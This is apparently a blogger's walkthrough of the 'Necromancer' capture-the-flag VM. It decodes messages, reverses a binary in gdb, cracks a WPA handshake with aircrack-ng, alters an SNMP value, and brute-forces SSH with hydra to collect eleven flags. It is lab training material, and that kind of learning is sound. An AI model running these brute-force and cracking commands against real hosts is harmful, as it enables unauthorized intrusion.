# The Necromancer: 1

### Challenge 1

I started off by running a port scan on all ports

```nmap -p- 192.168.1.100```

After a few minutes there were no open ports.

I have done other VMs by Xerubus so I decided to do a tcpdump to see what the host was up to.

I let it run for a few minutes and saw that the VM was trying to contact every device on my subnet on port 4444.

```nc -nvlp 4444```

I waited and got a large string back from the server.

~~~
V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi
~~~

I threw this into a base64 decoder and was greeted with a large message

~~~
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  

The air around you begins to get thicker, and your heart begins to beat against your chest. 
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!  
You look down and see you are standing in sand.  
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!  
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.  
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
~~~

And we have the first flag.


### Challenge 2

The flag hinted at giving the flag to 666. I did another port scan with 666 in scope and a new service appeared on the host.

The service was named doom. 

I tried ```echo "e6078b9b1aac915d11b9fd59791030bf" | nc 192.168.1.100 666```

That didn't work. I decided to try to crack the hash. It turned out to be md5 for opensesame.

I then realized that the prompt stated send the flag to u666 meaning use udp.

```echo "opensesame" | nc -u 192.168.1.100 666```

~~~
A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
~~~

We get flag2 and find out that port 80 is open.


### Challenge 3

I decided to port scan and saw that port 80 is open. Success.

The webserver had a nice image and some text. I took a deeper look at the image and Xerubus seems to have a thing for them. 

I tried steghide and neither of the previous keys worked. 

I then went to try binwalk and saw that there was a zipped portion of the jpg.

```gunzip feathers.jpg```

A feathers.txt file appeared with a base64 string. 

~~~
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
~~~

Decoding that gave me:

~~~
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
~~~


### Challenge 4

We have a URI to go off of so I started there. 

There was another image. I checked that out through binwalk and exiftool. Everything looked pretty much like an image. I then tried steghide. Still no luck. 

I really disliked this portion of the VM because most people just used a wordlist to find the next clue. One person googled it, but there wasn't enough of a hint.


Regardless at the /talisman URI we go there and get an executable.


Running strings on the talisman executable gave us two readable method names: chantToBreakSpell and wearTalisman

The solution ended up being using gdb to run the talisman program.

~~~
gdb ./talisman

(gdb) br chantToBreakSpell

(gdb) br wearTalisman

(gdb) run

Breakpoint 2, 0x0804852d in wearTalisman ()
(gdb) jump chantToBreakSpell

(gdb) continue

You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
~~~


### Challenge 5

The message said to contact port u31337 so I cracked the md5 hash to blackmagic and ran

```echo "blackmagic" | nc -u 192.168.1.100 31337```

~~~
As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}

~~~


### Challenge 6

The flag was on the webpage so nothing special here.

~~~
flag6{b1c3ed8f1db4258e4dcb0ce565f6dc03}
~~~

### Challenge 7

There was a link to a necromancer file. I downloaded that and ran file on it to determine what kind of file it was.

```file necromancer```

It was a bzip2 file. 

```bzip2 -dk necromancer```

I then ran file on the new file created

```file necromancer.out```

This was a tar file

```tar xvf necromancer.out```

```file necromancer.cap``` 

We had a tcpdump packet capture. I opened up wireshark to do some analysis.

I recognized that there was some deauthentication going on. I should have realized that this was a deauth attack to capture a valid handshake. I got some help and saw that I just needed to use aircrack-ng.

```aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt```

-> death2all

I messed around with port 161 for quite some time and learned a good amount about how snmp works. I eventually realized this would be the community name. 

```snmp-check -c death2all 192.168.1.100```

I got a message saying that I need to be able to write to the community and I should try death2allrw.

```snmp-check -c death2allrw 192.168.1.100```

I got a ton of information about the host. It dumped out the packages that are installed and what ports are open on tcp and udp.

I nmapped the server and found out snmp, smux, shell, doom, ev-services, and Elite were running. 

The answer lied within OIDS. There was one service running on the machine that ran snmpget on the OID .1.3.6.1.2.1.1.6.0

I googled around and learned this was the system's physical location. This could be used to say a network printer is in room B124. 

The string was currently "Locked" and so we just had to change it to be "Unlocked"

~~~
$ snmpget  -v 2c -c death2allrw 192.168.1.100 .1.3.6.1.2.1.1.6.0
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
$ snmpset  -v 2c -c death2allrw 192.168.1.100 .1.3.6.1.2.1.1.6.0 s "Unlocked"
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
$ snmpget  -v 2c -c death2allrw 192.168.1.100 .1.3.6.1.2.1.1.6.0
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
~~~

The flag cracks to demonslayer


### Challenge 8

I looked at what services were running and it appears that port 777 is now open. When we got the flag though it said - t22 which would indicate port 22 via tcp.

I tried to ssh in with necromancer:demonslayer. This didn't work. I decided to use a wordlist and try to crack both accounts. 

~~~
$ hydra -l demonslayer -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-08-19 11:48:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.1.100:22/
[22][ssh] host: 192.168.1.100   login: demonslayer   password: 12345678
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 8 final worker threads did not complete until end.
[ERROR] 8 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2017-08-19 11:48:40
~~~

demonslayer was a hit with 12345678 as the password.

Logging into the server gave me a flag.txt file containing advice to counter a spell at u777.


```nc -u localhost 777```

I was asked
~~~
Where do the Black Robes practice magic of the Greater Path?
~~~

Googling gave me the answer of Kelewan.

~~~
flag8{55a6af2ca3fee9f2fef81d20743bda2c}
~~~

### Challenge 9

Still on the same nc session we are asked
~~~
Who did Johan Faust VIII make a deal with?
~~~

Again googling gave me Mephistopheles

~~~
flag9{713587e17e796209d1df4c9c2c2d2966}
~~~

### Challenge 10

~~~
Who is tricked into passing the Ninth Gate?
~~~

Answer: Hedge.

~~~
flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.

On the ground is a small vile.

~~~

### Challenge 11

The hint was that the necromancer left behind a small vile. 

We do a quick ```ls -la``` and can see a .smallvile file has been created.

We open it and find out we have immense new power (sudo).

```sudo -l``` tells us that we can run cat on /root/flag11.txt

```sudo cat /root/flag11.txt``` 

Profit.

~~~
Suddenly you feel dizzy and fall to the ground!

As you open your eyes you find yourself staring at a computer screen.

Congratulations!!! You have conquered......

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}


Big shout out to Dook and Bull for being test bunnies.

Cheers OJ for the obfuscation help.

Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.

"========================================="
"  xerubus (@xerubus) - www.mogozobo.com  "
"========================================="

~~~
